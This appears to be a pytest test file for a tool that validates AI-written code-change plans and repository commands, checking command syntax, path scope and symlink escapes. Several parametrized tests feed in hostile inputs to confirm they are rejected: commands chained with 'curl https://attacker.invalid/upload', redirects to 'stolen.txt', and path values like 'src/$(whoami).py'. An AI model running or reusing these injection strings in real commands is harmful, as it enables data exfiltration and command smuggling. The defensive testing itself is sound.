import json
import subprocess
from copy import deepcopy
from pathlib import Path
from typing import Any

import pytest
from jsonschema import Draft202012Validator

import daydream.improve.plans as improve_plans
from daydream.improve.command_contract import validate_recon_commands
from daydream.improve.plans import (
    _literal_command_error,
    load_rejections,
    planned_fingerprints,
    record_rejections,
    validate_plan_result,
    write_plans,
)


@pytest.mark.parametrize(
    ("literal", "expected"),
    [
        ("go build ./...", None),
        ("rg 'foo(bar)' src", None),
        ('grep -E "foo\\(bar\\)" src/app.py', None),
        ("pytest ...", "MALFORMED_COMMAND"),
        ("pytest tests (focused suite)", "MALFORMED_COMMAND"),
        ("pytest tests && rm -rf build", "MALFORMED_COMMAND"),
    ],
)
def test_verification_command_literal_validation(
    literal: str,
    expected: str | None,
) -> None:
    assert _literal_command_error(literal) == expected


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", *args],
        cwd=repo,
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def _repo(tmp_path: Path) -> tuple[Path, str]:
    repo = tmp_path / "repo"
    (repo / "apps/catalog").mkdir(parents=True)
    (repo / "tests").mkdir()
    (repo / "README.md").write_text("# Catalog service\n", encoding="utf-8")
    (repo / "Makefile").write_text(
        "test:\n\tuv run pytest\n",
        encoding="utf-8",
    )
    (repo / "apps/catalog/api.py").write_text(
        "def list_catalog():\n"
        "    return [load_item(item_id) for item_id in item_ids]\n",
        encoding="utf-8",
    )
    (repo / "tests/test_catalog.py").write_text(
        "def test_list_catalog_returns_items():\n"
        "    assert list_catalog()\n",
        encoding="utf-8",
    )
    _git(repo, "init", "-b", "main")
    _git(repo, "config", "user.email", "test@example.com")
    _git(repo, "config", "user.name", "Test")
    _git(repo, "add", ".")
    _git(repo, "commit", "-m", "initial")
    return repo, _git(repo, "rev-parse", "HEAD")


def _finding(*, fingerprint: str = "fp-fix-n-plus-one") -> dict[str, object]:
    return {
        "fingerprint": fingerprint,
        "title": "Fix N+1 catalog queries",
        "category": "performance",
        "path": "apps/catalog/api.py",
        "body": "The endpoint issues one query per catalog item.",
        "impact": "HIGH",
        "effort": "M",
        "risk": "MED",
        "confidence": "HIGH",
        "evidence": ["apps/catalog/api.py:1"],
    }


def _command(
    purpose: str,
    observable: str,
    *,
    paths: list[str] | None = None,
) -> dict[str, Any]:
    scoped_paths = paths or []
    return {
        "purpose": purpose,
        "command": "uv run pytest tests/test_catalog.py -q",
        "working_directory": ".",
        "expected_success": {
            "exit_code": 0,
            "observable_result": observable,
        },
        "applicability": {
            "scope": (
                {"kind": "in-scope-paths", "paths": scoped_paths}
                if scoped_paths
                else {"kind": "whole-repository"}
            ),
            "preconditions": [],
            "rationale": "This focused command exercises the catalog behavior.",
        },
        "provenance": {
            "kind": "planner-derived",
            "recon_command_id": "test-suite",
            "source_path": "tests/test_catalog.py",
        },
    }


def _recon_commands() -> list[dict[str, Any]]:
    return [
        {
            "id": "test-suite",
            "purpose": "Run the repository Python test suite",
            "command": "uv run pytest",
            "working_directory": ".",
            "expected_success": {
                "exit_code": 0,
                "observable_result": "exit 0 and the selected pytest tests pass",
            },
            "applicability": {
                "scope": {"kind": "whole-repository"},
                "preconditions": [],
                "rationale": "The Makefile declares this repository-wide test entry point.",
            },
            "evidence": {
                "kind": "literal-command",
                "source_path": "Makefile",
                "line_anchor": {"start_line": 2, "end_line": 2},
                "verbatim_excerpt": "\tuv run pytest",
            },
        },
        {
            "id": "git-diff",
            "purpose": "Check that unrelated paths remain unchanged",
            "command": "git diff --exit-code",
            "working_directory": ".",
            "expected_success": {
                "exit_code": 0,
                "observable_result": "exit 0 and no unexpected diff is reported",
            },
            "applicability": {
                "scope": {"kind": "whole-repository"},
                "preconditions": [],
                "rationale": "Git repository metadata establishes the diff command.",
            },
            "evidence": {
                "kind": "literal-command",
                "source_path": "README.md",
                "line_anchor": {"start_line": 1, "end_line": 1},
                "verbatim_excerpt": "# Catalog service",
            },
        },
    ]


def test_recon_validation_retains_valid_siblings_when_one_is_invalid(
    tmp_path: Path,
) -> None:
    repo, _ = _repo(tmp_path)
    commands = []
    for index in range(3):
        command = deepcopy(_recon_commands()[0])
        command["id"] = f"command-{index:02d}"
        commands.append(command)
    commands[1]["applicability"]["scope"]["kind"] = "unsupported"

    accepted, errors = validate_recon_commands(
        {"commands": commands},
        repo=repo,
    )

    assert [item["id"] for item in accepted] == ["command-00", "command-02"]
    assert errors == [
        "RECON_APPLICABILITY_INVALID@/commands/1/applicability/scope/kind"
    ]


@pytest.mark.parametrize(
    "model_excerpt",
    [
        pytest.param("uv run pytest", id="model-text-is-not-canonical"),
        pytest.param(None, id="model-text-is-optional"),
        pytest.param(42, id="model-text-has-non-string-shape"),
    ],
)
def test_recon_evidence_uses_locators_and_persists_host_excerpt(
    tmp_path: Path,
    model_excerpt: object,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "Makefile").write_text(
        "test:\n\tuv run pytest\n\n",
        encoding="utf-8",
    )
    evidence: dict[str, Any] = {
        "kind": "literal-command",
        "source_path": "Makefile",
        "line_anchor": {"start_line": 2, "end_line": 3},
    }
    if model_excerpt is not None:
        evidence["verbatim_excerpt"] = model_excerpt
    command = _contract_recon_command(
        command_id="test-suite",
        command="uv run pytest",
        evidence=evidence,
    )
    raw_command = deepcopy(command)

    accepted, errors = validate_recon_commands(
        {"commands": [command]},
        repo=repo,
    )

    assert errors == []
    assert command == raw_command
    assert accepted[0]["evidence"]["verbatim_excerpt"] == "\tuv run pytest\n"


def test_invalid_recon_locator_rejects_only_its_candidate(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "Makefile").write_text(
        "test:\n\tuv run pytest\n",
        encoding="utf-8",
    )
    valid = _contract_recon_command(
        command_id="test-suite",
        command="uv run pytest",
        evidence={
            "kind": "literal-command",
            "source_path": "Makefile",
            "line_anchor": {"start_line": 2, "end_line": 2},
        },
    )
    invalid = deepcopy(valid)
    invalid["id"] = "invalid-anchor"
    invalid["evidence"]["line_anchor"]["end_line"] = 20

    accepted, errors = validate_recon_commands(
        {"commands": [invalid, valid]},
        repo=repo,
    )

    assert [command["id"] for command in accepted] == ["test-suite"]
    assert errors == ["RECON_EVIDENCE_MISMATCH@/commands/0/evidence"]


def _contract_applicability(
    *paths: str,
    preconditions: list[str] | None = None,
) -> dict[str, Any]:
    scope: dict[str, Any]
    if paths:
        scope = {"kind": "in-scope-paths", "paths": list(paths)}
    else:
        scope = {"kind": "whole-repository"}
    return {
        "scope": scope,
        "preconditions": preconditions or [],
        "rationale": "This command is applicable to the declared repository scope.",
    }


def _contract_recon_command(
    *,
    command_id: str,
    command: str,
    evidence: dict[str, Any],
    working_directory: str = ".",
    paths: tuple[str, ...] = (),
) -> dict[str, Any]:
    return {
        "id": command_id,
        "purpose": f"Run the repository command {command_id}",
        "command": command,
        "working_directory": working_directory,
        "expected_success": {
            "exit_code": 0,
            "observable_result": "exit 0 and the declared command completes successfully",
        },
        "applicability": _contract_applicability(*paths),
        "evidence": evidence,
    }


def test_command_contract_schema_and_applicability_semantics_are_in_parity(
    tmp_path: Path,
) -> None:
    from daydream.improve.command_contract import (
        APPLICABILITY_SCHEMA,
        validate_applicability,
    )

    repo = tmp_path / "repo"
    (repo / "frontend").mkdir(parents=True)
    variants = [
        _contract_applicability(),
        _contract_applicability("frontend"),
        _contract_applicability("frontend/"),
        _contract_applicability(
            "frontend/",
            preconditions=[
                "Docker is running",
                "Project dependencies are installed",
            ],
        ),
    ]

    validator = Draft202012Validator(APPLICABILITY_SCHEMA)
    for applicability in variants:
        assert list(validator.iter_errors(applicability)) == []
        normalized, rejection = validate_applicability(
            applicability,
            repo=repo,
        )
        assert rejection is None
        assert normalized is not None

    assert variants[2]["scope"]["paths"] == ["frontend/"]
    normalized, _ = validate_applicability(variants[2], repo=repo)
    assert normalized is not None
    assert normalized["scope"]["paths"] == ["frontend"]


def test_command_contract_schema_discloses_scope_cross_field_invariants() -> None:
    from daydream.improve.command_contract import APPLICABILITY_SCHEMA

    invalid_variants = [
        {
            "scope": {"kind": "whole-repository", "paths": ["frontend"]},
            "preconditions": [],
            "rationale": "Whole repository commands cannot also declare paths.",
        },
        {
            "scope": {"kind": "in-scope-paths", "paths": []},
            "preconditions": [],
            "rationale": "Scoped commands must identify at least one safe scope.",
        },
    ]

    validator = Draft202012Validator(APPLICABILITY_SCHEMA)
    assert all(list(validator.iter_errors(item)) for item in invalid_variants)


def test_make_and_package_script_evidence_structurally_derives_commands(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    (repo / "admin-dashboard").mkdir(parents=True)
    make_lines = [
        "build: ## Build every module",
        "test: ## Run all tests",
        "test-frontend: ## Run frontend tests",
        "lint: ## Run all linters",
        "typecheck: ## Run all type checkers",
    ]
    (repo / "Makefile").write_text(
        "\n".join(make_lines) + "\n",
        encoding="utf-8",
    )
    package_line = (
        '{"name":"admin-dashboard","packageManager":"pnpm@10.27.0",'
        '"scripts":{"test":"vitest run"}}'
    )
    (repo / "admin-dashboard/package.json").write_text(
        package_line + "\n",
        encoding="utf-8",
    )

    commands = [
        _contract_recon_command(
            command_id=f"make-{target}",
            command=f"make {target}",
            evidence={
                "kind": "make-target",
                "source_path": "Makefile",
                "line_anchor": {
                    "start_line": index,
                    "end_line": index,
                },
                "verbatim_excerpt": declaration,
                "target": target,
            },
        )
        for index, (target, declaration) in enumerate(
            zip(
                ("build", "test", "test-frontend", "lint", "typecheck"),
                make_lines,
                strict=True,
            ),
            start=1,
        )
    ]
    commands.append(
        _contract_recon_command(
            command_id="pnpm-test-admin",
            command="pnpm test",
            working_directory="admin-dashboard",
            paths=("admin-dashboard/",),
            evidence={
                "kind": "package-script",
                "source_path": "admin-dashboard/package.json",
                "line_anchor": {"start_line": 1, "end_line": 1},
                "verbatim_excerpt": package_line,
                "package_manager": "pnpm",
                "script": "test",
                "working_directory": "admin-dashboard",
            },
        )
    )

    accepted, errors = validate_recon_commands(
        {"commands": commands},
        repo=repo,
    )

    assert errors == []
    assert [item["command"] for item in accepted] == [
        "make build",
        "make test",
        "make test-frontend",
        "make lint",
        "make typecheck",
        "pnpm test",
    ]
    assert all(
        item["command"] not in item["evidence"]["verbatim_excerpt"]
        for item in accepted
    )


def test_package_script_evidence_rejects_same_named_key_outside_scripts(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    package = repo / "admin-dashboard"
    package.mkdir(parents=True)
    manifest_lines = [
        "{",
        '  "packageManager": "pnpm@10.27.0",',
        '  "config": {"test": "not a package script"},',
        '  "scripts": {',
        '    "test": "vitest run"',
        "  }",
        "}",
    ]
    (package / "package.json").write_text(
        "\n".join(manifest_lines) + "\n",
        encoding="utf-8",
    )
    command = _contract_recon_command(
        command_id="pnpm-test-admin",
        command="pnpm test",
        working_directory="admin-dashboard",
        paths=("admin-dashboard",),
        evidence={
            "kind": "package-script",
            "source_path": "admin-dashboard/package.json",
            "line_anchor": {"start_line": 3, "end_line": 3},
            "verbatim_excerpt": manifest_lines[2],
            "package_manager": "pnpm",
            "script": "test",
            "working_directory": "admin-dashboard",
        },
    )

    accepted, errors = validate_recon_commands(
        {"commands": [command]},
        repo=repo,
    )

    assert accepted == []
    assert errors == ["RECON_EVIDENCE_MISMATCH@/commands/0/evidence"]


@pytest.mark.parametrize(
    "scope",
    [
        "../frontend",
        "/frontend",
        "frontend/../../outside",
        "frontend/${PACKAGE}",
        "frontend/*",
    ],
)
def test_recon_applicability_directory_scopes_fail_closed(
    tmp_path: Path,
    scope: str,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    command = _contract_recon_command(
        command_id="make-test",
        command="make test",
        paths=(scope,),
        evidence={
            "kind": "make-target",
            "source_path": "Makefile",
            "line_anchor": {"start_line": 1, "end_line": 1},
            "verbatim_excerpt": "test:",
            "target": "test",
        },
    )

    accepted, errors = validate_recon_commands(
        {"commands": [command]},
        repo=repo,
    )

    assert accepted == []
    assert errors == [
        "RECON_APPLICABILITY_INVALID@/commands/0/applicability/scope/paths/0"
    ]


def _typed_plan(*, slug: str = "batch-catalog-queries") -> dict[str, Any]:
    step_gate = _command(
        "Verify batched catalog loading",
        "exit 0 and the named catalog regression test passes",
        paths=["apps/catalog/api.py", "tests/test_catalog.py"],
    )
    test_gate = _command(
        "Run the named catalog regression",
        "exit 0 and test_list_catalog_batches_item_loading passes",
    )
    scope_gate = {
        **_command(
            "Confirm only declared paths changed",
            "exit 0 and no path outside the declared scope is listed",
        ),
        "command": "git diff --exit-code -- README.md",
        "provenance": {
            "kind": "planner-derived",
            "recon_command_id": "git-diff",
            "source_path": "apps/catalog/api.py",
        },
    }
    return {
        "slug": slug,
        "title": "Batch catalog queries before loading items",
        "priority": "P1",
        "dependencies": [],
        "why_this_matters": {
            "problem": "list_catalog currently loads each catalog item separately.",
            "concrete_cost": "Large catalogs create avoidable query latency per request.",
            "intended_outcome": "list_catalog batches item loading while preserving results.",
        },
        "current_state_excerpts": [
            {
                "path": "apps/catalog/api.py",
                "line_anchor": {"start_line": 1, "end_line": 2},
                "file_role": "Catalog list endpoint and item-loading loop.",
                "verbatim_excerpt": (
                    "def list_catalog():\n"
                    "    return [load_item(item_id) for item_id in item_ids]"
                ),
            },
            {
                "path": "tests/test_catalog.py",
                "line_anchor": {"start_line": 1, "end_line": 2},
                "file_role": "Existing catalog endpoint regression tests.",
                "verbatim_excerpt": (
                    "def test_list_catalog_returns_items():\n"
                    "    assert list_catalog()"
                ),
            },
        ],
        "commands_you_will_need": [
            _command(
                "Run focused catalog tests",
                "exit 0 and all catalog tests pass",
            )
        ],
        "scope": {
            "existing_paths": [
                {
                    "path": "apps/catalog/api.py",
                    "role": "Implement batched catalog loading.",
                },
                {
                    "path": "tests/test_catalog.py",
                    "role": "Add catalog query regression coverage.",
                },
            ],
            "new_paths": [],
            "out_of_scope_paths": [
                {
                    "path": "README.md",
                    "reason": "Catalog batching does not change user documentation.",
                }
            ],
            "out_of_scope_behaviors": [
                {
                    "behavior": "The public catalog response shape remains unchanged.",
                    "reason": "Existing API consumers depend on the current response.",
                }
            ],
        },
        "git_workflow": {
            "branch_name": "use the operator's current branch",
            "branch_basis": "Recon found no repository branch naming convention.",
            "commit_boundaries": "Commit the behavior and its tests as one logical unit.",
            "commit_message_example": "perf: batch catalog item loading",
            "push_policy": "never-without-operator-instruction",
            "pull_request_policy": "never-without-operator-instruction",
        },
        "steps": [
            {
                "id": "step-1",
                "order": 1,
                "title": "Batch item loading in list_catalog",
                "changes": [
                    {
                        "path": "apps/catalog/api.py",
                        "symbol": "list_catalog",
                        "operation": "modify",
                        "instruction": "Replace per-item load_item calls with one batched lookup.",
                        "target_state": "list_catalog performs one batch lookup and preserves order.",
                    },
                    {
                        "path": "tests/test_catalog.py",
                        "symbol": "test_list_catalog_batches_item_loading",
                        "operation": "modify",
                        "instruction": "Add a regression that counts the catalog loader calls.",
                        "target_state": "test_list_catalog_batches_item_loading proves one batch call.",
                    },
                ],
                "verification": step_gate,
            },
        ],
        "test_plan": {
            "exemplars": [
                {
                    "path": "tests/test_catalog.py",
                    "symbol": "test_list_catalog_returns_items",
                    "pattern_to_copy": "Use the existing direct function-call assertion style.",
                }
            ],
            "cases": [
                {
                    "name": "Catalog loading uses one batch query",
                    "test_file": "tests/test_catalog.py",
                    "test_symbol": "test_list_catalog_batches_item_loading",
                    "kind": "unit",
                    "setup": "Provide three item identifiers and a recording batch loader.",
                    "action": "Call list_catalog once with the three catalog identifiers.",
                    "assertions": [
                        "The loader receives all three identifiers in one call.",
                        "The returned catalog item order remains unchanged.",
                    ],
                    "verification": test_gate,
                }
            ],
        },
        "done_criteria": [
            {
                "id": "done-1",
                "kind": "behavior",
                "description": "list_catalog performs one batch load for multiple items.",
                "verification": step_gate,
            },
            {
                "id": "done-2",
                "kind": "test-gate",
                "description": "The named catalog batching regression test passes.",
                "verification": test_gate,
            },
            {
                "id": "done-3",
                "kind": "scope-integrity",
                "description": "No file outside the declared catalog scope changes.",
                "verification": scope_gate,
            },
        ],
        "stop_conditions": [
            {
                "kind": "drift",
                "condition": "apps/catalog/api.py no longer matches the quoted list_catalog excerpt.",
                "required_action": "STOP_AND_REPORT",
                "evidence_to_report": "Report the current list_catalog lines and planned-at commit.",
                "related_paths": ["apps/catalog/api.py"],
                "related_step_ids": ["step-1"],
            },
            {
                "kind": "repeated-verification-failure",
                "condition": "The focused catalog verification command fails twice.",
                "required_action": "STOP_AND_REPORT",
                "evidence_to_report": "Report both command outputs and the attempted correction.",
                "related_paths": ["tests/test_catalog.py"],
                "related_step_ids": ["step-1"],
            },
            {
                "kind": "out-of-scope-change",
                "condition": "The implementation requires changing README.md or API consumers.",
                "required_action": "STOP_AND_REPORT",
                "evidence_to_report": "Report the required path and why the boundary is insufficient.",
                "related_paths": ["README.md"],
                "related_step_ids": ["step-1"],
            },
            {
                "kind": "false-assumption",
                "condition": "The load_item interface cannot accept multiple catalog identifiers.",
                "required_action": "STOP_AND_REPORT",
                "evidence_to_report": "Report the load_item signature and its only supported input.",
                "related_paths": ["apps/catalog/api.py"],
                "related_step_ids": ["step-1"],
            },
        ],
        "maintenance_notes": {
            "future_interactions": [
                {
                    "area": "Catalog pagination",
                    "note": "Revisit the batch size if catalog pagination is introduced.",
                }
            ],
            "review_risks": [
                {
                    "risk": "Batch results could arrive in a different item order.",
                    "review_check": "Confirm the implementation restores requested identifier order.",
                }
            ],
            "deferred_items": [],
        },
    }


def _selection(
    *,
    plan: dict[str, Any] | None = None,
    fingerprint: str = "fp-fix-n-plus-one",
) -> dict[str, Any]:
    return {"finding": _finding(fingerprint=fingerprint), **(plan or _typed_plan())}


def _typed_new_file_plan() -> dict[str, Any]:
    plan = _typed_plan(slug="add-catalog-batching-regression")
    new_test = "tests/test_catalog_batching.py"
    plan["scope"]["new_paths"] = [
        {
            "path": new_test,
            "role": "Add focused catalog query batching regression coverage.",
        }
    ]
    test_change = plan["steps"][0]["changes"][1]
    test_change.update(path=new_test, operation="create")
    plan["steps"][0]["verification"]["applicability"]["scope"]["paths"][1] = (
        new_test
    )
    plan["test_plan"]["cases"][0]["test_file"] = new_test
    return plan


def test_typed_plan_renders_complete_deterministic_handoff(tmp_path: Path) -> None:
    repo, sha = _repo(tmp_path)
    result = write_plans(
        repo / "daydream_plans",
        [_selection()],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
    assert "## Maintenance notes" in text
    assert "### Step 1: Batch item loading in list_catalog" in text
    assert "**Command**: `uv run pytest tests/test_catalog.py -q`" in text
    assert "test_list_catalog_batches_item_loading" in text
    assert "apps/catalog/api.py:1-2" in text
    assert "return [load_item(item_id) for item_id in item_ids]" in text
    assert "TODO" in (repo / "daydream_plans/README.md").read_text()


MALFORMED_FIRST_RUN_COMMANDS = (
    "make test -> uv run pytest -n auto",
    "pre-push hook (...): uv lock --check && ...",
    "CI checks: uv run pytest -q",
    "Continuous integration => npm test",
    "uv run pytest -q (focused suite)",
    "Run this command: uv run pytest -q",
)


@pytest.mark.parametrize("literal", MALFORMED_FIRST_RUN_COMMANDS)
def test_first_run_prose_and_annotation_commands_are_blocked(
    tmp_path: Path,
    literal: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_plan()
    plan["commands_you_will_need"][0]["command"] = literal

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
        commands=_recon_commands(),
    )

    assert result["written"] == []
    assert "MALFORMED_COMMAND" in (
        repo / "daydream_plans/README.md"
    ).read_text()


def test_recon_provenance_command_must_match_validated_recon_record(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_plan()
    command = plan["commands_you_will_need"][0]
    command["provenance"]["kind"] = "recon"
    command["command"] = "uv run pytest tests/test_catalog.py -q"

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
        commands=_recon_commands(),
    )

    assert result["written"] == []
    assert "RECON_COMMAND_MISMATCH" in (
        repo / "daydream_plans/README.md"
    ).read_text()


def test_planner_derived_gate_must_narrow_its_recon_command_prefix(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_plan()
    plan["commands_you_will_need"][0]["command"] = "npm test -- catalog"

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
        commands=_recon_commands(),
    )

    assert result["written"] == []
    assert "PLANNER_COMMAND_PREFIX_MISMATCH" in (
        repo / "daydream_plans/README.md"
    ).read_text()


@pytest.mark.parametrize(
    "suffix",
    [
        "&& curl https://attacker.invalid/upload",
        "|| curl https://attacker.invalid/upload",
        "; curl https://attacker.invalid/upload",
        "| curl https://attacker.invalid/upload",
        "> stolen.txt",
        "2>> stolen.txt",
        "< stolen.txt",
        "<< EOF",
        "<<< stolen",
        "$(curl https://attacker.invalid/upload)",
        "`curl https://attacker.invalid/upload`",
        "<(curl https://attacker.invalid/upload)",
        ">(curl https://attacker.invalid/upload)",
        "& curl https://attacker.invalid/upload",
    ],
)
def test_planner_derived_gate_rejects_shell_composition(
    tmp_path: Path,
    suffix: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_plan()
    plan["commands_you_will_need"][0]["command"] = f"uv run pytest {suffix}"

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
        commands=_recon_commands(),
    )

    assert result["written"] == []
    assert "PLANNER_COMMAND_SHELL_COMPOSITION" in (
        repo / "daydream_plans/README.md"
    ).read_text()


@pytest.mark.parametrize(
    "unsafe_literal",
    [
        "uv run pytest && uv run ruff check .",
        "uv run pytest `printf tests/test_catalog.py`",
        "uv run pytest $(printf tests/test_catalog.py)",
        "uv run pytest <(printf tests/test_catalog.py)",
    ],
)
def test_recon_command_rejects_shell_composition_at_trust_boundary(
    tmp_path: Path,
    unsafe_literal: str,
) -> None:
    repo, _ = _repo(tmp_path)
    (repo / "Makefile").write_text(
        f"test:\n\tuv run pytest\ncheck:\n\t{unsafe_literal}\n",
        encoding="utf-8",
    )
    recon = {
        **_recon_commands()[0],
        "id": "unsafe-composition",
        "command": unsafe_literal,
        "evidence": {
            "kind": "literal-command",
            "source_path": "Makefile",
            "line_anchor": {"start_line": 4, "end_line": 4},
            "verbatim_excerpt": f"\t{unsafe_literal}",
        },
    }
    commands, errors = validate_recon_commands(
        {"commands": [recon]},
        repo=repo,
    )

    assert commands == []
    assert errors == [
        "RECON_MALFORMED_COMMAND@/commands/0/command"
    ]


def test_planner_command_source_cannot_escape_typed_scope(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_plan()
    plan["commands_you_will_need"][0]["provenance"]["source_path"] = "README.md"

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
        commands=_recon_commands(),
    )

    assert result["written"] == []
    assert "PATH_OUT_OF_SCOPE" in (
        repo / "daydream_plans/README.md"
    ).read_text()


@pytest.mark.parametrize(
    ("path", "expected_code"),
    [
        ("README.md (no precision/target/50% match)", "SCHEMA_INVALID"),
        ("/tmp/catalog.py", "SCHEMA_INVALID"),
        ("../catalog.py", "SCHEMA_INVALID"),
        ("docs/catalog|tee.md", "SCHEMA_INVALID"),
        ("docs/catalog#draft.md", "SCHEMA_INVALID"),
    ],
)
def test_annotated_absolute_escaping_and_metachar_paths_are_blocked(
    tmp_path: Path,
    path: str,
    expected_code: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_new_file_plan()
    plan["scope"]["new_paths"][0]["path"] = path
    plan["steps"][0]["changes"][1]["path"] = path
    plan["steps"][0]["changes"][1]["target_state"] = (
        f"{path} contains a deterministic catalog batching regression."
    )

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
    )

    assert result["written"] == []
    assert expected_code in (
        repo / "daydream_plans/README.md"
    ).read_text()


def _set_model_path(plan: dict[str, Any], location: str, path: str) -> None:
    if location == "existing":
        plan["scope"]["existing_paths"][0]["path"] = path
    elif location == "new":
        plan["scope"]["new_paths"][0]["path"] = path
    elif location == "out-of-scope":
        plan["scope"]["out_of_scope_paths"][0]["path"] = path
    elif location == "excerpt":
        plan["current_state_excerpts"][0]["path"] = path
    elif location == "step":
        plan["steps"][0]["changes"][0]["path"] = path
    elif location == "test":
        plan["test_plan"]["cases"][0]["test_file"] = path
    elif location == "test-exemplar":
        plan["test_plan"]["exemplars"][0]["path"] = path
    elif location == "command-source":
        plan["commands_you_will_need"][0]["provenance"]["source_path"] = path
    elif location == "command-applicability":
        plan["steps"][0]["verification"]["applicability"]["scope"]["paths"][
            0
        ] = path
    elif location == "working-directory":
        plan["commands_you_will_need"][0]["working_directory"] = path
    elif location == "stop-related":
        plan["stop_conditions"][0]["related_paths"][0] = path
    else:
        raise AssertionError(f"unknown path location: {location}")


@pytest.mark.parametrize(
    "location",
    [
        "existing",
        "new",
        "out-of-scope",
        "excerpt",
        "step",
        "test",
        "test-exemplar",
        "command-source",
        "command-applicability",
        "working-directory",
        "stop-related",
    ],
)
def test_every_model_authored_path_rejects_a_symlink_crossing(
    tmp_path: Path,
    location: str,
) -> None:
    repo, sha = _repo(tmp_path)
    outside = tmp_path / "outside"
    outside.mkdir()
    (repo / "escape").symlink_to(outside, target_is_directory=True)
    plan = _typed_new_file_plan()
    _set_model_path(
        plan,
        location,
        "escape" if location == "working-directory" else "escape/pwn.py",
    )

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
        commands=_recon_commands(),
    )

    assert result["written"] == []
    assert "PATH_OUTSIDE_REPOSITORY" in (
        repo / "daydream_plans/README.md"
    ).read_text()


@pytest.mark.parametrize(
    "location",
    [
        "existing",
        "new",
        "out-of-scope",
        "excerpt",
        "step",
        "test",
        "test-exemplar",
        "command-source",
        "command-applicability",
        "working-directory",
        "stop-related",
    ],
)
def test_react_router_dollar_segment_is_valid(
    tmp_path: Path,
    location: str,
) -> None:
    repo, sha = _repo(tmp_path)
    path = "routes/user.$username.tsx"
    (repo / "routes").mkdir()
    (repo / path).write_text("export default function User() {}\n", encoding="utf-8")
    _git(repo, "add", path)
    _git(repo, "commit", "-m", "add literal dollar route")
    sha = _git(repo, "rev-parse", "HEAD")
    plan = _typed_new_file_plan()
    _set_model_path(
        plan,
        location,
        "routes" if location == "working-directory" else path,
    )

    errors = validate_plan_result(
        plan,
        repo=repo,
        planned_at=sha,
        finding=_finding(),
        recon_commands=_recon_commands(),
    )

    assert improve_plans.valid_plan_path(path, repo=repo)
    assert not any(
        error.startswith(("SCHEMA_INVALID", "MALFORMED_PATH", "PATH_OUTSIDE"))
        for error in errors
    )


@pytest.mark.parametrize("path", ["services/api/", "services/api"])
def test_out_of_scope_directory_prefix_accepts_trailing_slash(
    tmp_path: Path,
    path: str,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_plan()
    plan["scope"]["out_of_scope_paths"][0]["path"] = path

    errors = validate_plan_result(
        plan,
        repo=repo,
        planned_at=sha,
        finding=_finding(),
        recon_commands=_recon_commands(),
    )

    assert improve_plans.valid_directory_scope(path, repo=repo)
    assert not any(
        error.startswith(("SCHEMA_INVALID", "MALFORMED_PATH", "PATH_OUTSIDE"))
        for error in errors
    )


@pytest.mark.parametrize(
    "path",
    ["../outside.py", "src/$(whoami).py", "linked-outside/secret.py"],
)
def test_repository_file_path_rejects_escape_and_substitution(
    tmp_path: Path,
    path: str,
) -> None:
    repo, _ = _repo(tmp_path)
    outside = tmp_path / "outside"
    outside.mkdir()
    (repo / "linked-outside").symlink_to(outside, target_is_directory=True)

    assert not improve_plans.valid_plan_path(path, repo=repo)


@pytest.mark.parametrize("tracked", [False, True])
@pytest.mark.parametrize("scope_kind", ["existing_paths", "new_paths"])
def test_scope_paths_reject_tracked_and_untracked_symlinked_parents(
    tmp_path: Path,
    tracked: bool,
    scope_kind: str,
) -> None:
    repo, sha = _repo(tmp_path)
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "pwn.py").write_text("outside = True\n", encoding="utf-8")
    (repo / "escape").symlink_to(outside, target_is_directory=True)
    if tracked:
        _git(repo, "add", "escape")
        _git(repo, "commit", "-m", "track escape symlink")
        sha = _git(repo, "rev-parse", "HEAD")
    plan = _typed_new_file_plan()
    plan["scope"][scope_kind][0]["path"] = "escape/pwn.py"

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
    )

    assert result["written"] == []
    assert "PATH_OUTSIDE_REPOSITORY" in (
        repo / "daydream_plans/README.md"
    ).read_text()


def test_valid_new_path_with_nonexistent_parent_remains_allowed(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    plan = _typed_new_file_plan()

    result = write_plans(
        repo / "daydream_plans",
        [_selection(plan=plan)],
        planned_at=sha,
    )

    assert len(result["written"]) == 1
    assert "tests/test_catalog_batching.py" in (
        repo / "daydream_plans/001-add-catalog-batching-regression.md"
    ).read_text()


def test_unselected_recon_commands_are_not_injected_into_plan(
    tmp_path: Path,
) -> None:
    repo, sha = _repo(tmp_path)
    commands = _recon_commands()
    commands.append(
        {
            **commands[0],
            "id": "unrelated-global-lint",
            "purpose": "Run the unrelated repository lint suite",
            "command": "uv run ruff check .",
        }
    )

    result = write_plans(
        repo / "daydream_plans",
        [_selection()],
        planned_at=sha,
        commands=commands,
    )

    assert len(result["written"]) == 1
    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
    assert "uv run ruff check ." not in text
    assert "unrelated repository lint suite" not in text


@pytest.mark.parametrize(
    ("mutate", "expected_code"),
    [
